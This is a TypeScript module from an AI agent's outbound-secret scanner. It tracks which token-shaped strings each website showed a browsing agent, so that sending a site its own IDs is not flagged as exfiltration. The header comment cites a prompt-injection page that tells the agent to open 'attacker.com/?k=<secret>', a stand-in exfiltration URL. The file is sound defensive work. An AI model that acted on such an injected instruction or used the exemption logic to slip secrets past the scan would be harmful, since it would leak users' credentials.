/**
 * Where a token-shaped string came from, per session and per site.
 *
 * The outbound scan's entropy pass flags any long random-looking run, which
 * on the web is mostly IDs: a Twilio Account SID in a console URL, an order
 * id, a commit hash. Sending a site an ID that site itself showed the agent
 * is not exfiltration. Sending it anywhere else, or sending a string no page
 * of that site ever showed, still is. The attacker's page that says "open
 * attacker.com/?k=<secret>" cannot have shown the agent the user's secret, so
 * this exempts the console URL and never the injection.
 *
 * The browser tool records what each result showed under the site of the
 * page it ended on (the page text and its URL). Only entropy-heuristic hits
 * consult this: vault values, known key formats and tainted bytes are judged
 * as before.
 */
import { detectHighEntropyTokens } from "../security/secrets/entropy-detector.js";
import { registrableDomain } from "./registrable-domain.js";

/** Per-session cap on remembered tokens; past it nothing new is exempted. */
const MAX_TOKENS_PER_SESSION = 5_000;

interface SessionProvenance {
  bySite: Map<string, Set<string>>;
  count: number;
  /** The page the session's last browser result ended on. */
  lastPageUrl: string;
}

const sessions = new Map<string, SessionProvenance>();

function siteOf(url: string): string | null {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    return registrableDomain(u.hostname) ?? u.hostname.toLowerCase();
  } catch {
    return null;
  }
}

/** Record the token-shaped strings a browser result showed, under the site of
 *  the page it ended on. */
export function recordSiteTokens(sessionId: string, pageUrl: string, shown: string): void {
  const site = siteOf(pageUrl);
  if (!sessionId || !site) return;
  let state = sessions.get(sessionId);
  if (!state) {
    state = { bySite: new Map(), count: 0, lastPageUrl: "" };
    sessions.set(sessionId, state);
  }
  state.lastPageUrl = pageUrl;
  let seen = state.bySite.get(site);
  if (!seen) {
    seen = new Set();
    state.bySite.set(site, seen);
  }
  for (const { value } of detectHighEntropyTokens(`${pageUrl}\n${shown}`)) {
    if (seen.has(value)) continue;
    if (state.count >= MAX_TOKENS_PER_SESSION) return;
    seen.add(value);
    state.count += 1;
  }
}

/** Did a page of `destinationUrl`'s site show this session `token`? */
export function shownBySite(sessionId: string, destinationUrl: string, token: string): boolean {
  const site = siteOf(destinationUrl);
  return !!site && !!sessions.get(sessionId)?.bySite.get(site)?.has(token);
}

/** The page the session's browser is on, as of its last result ("" if none). */
export function lastBrowserPageUrl(sessionId: string): string {
  return sessions.get(sessionId)?.lastPageUrl ?? "";
}

/** Test hook. */
export function _clearSiteProvenance(): void {
  sessions.clear();
}
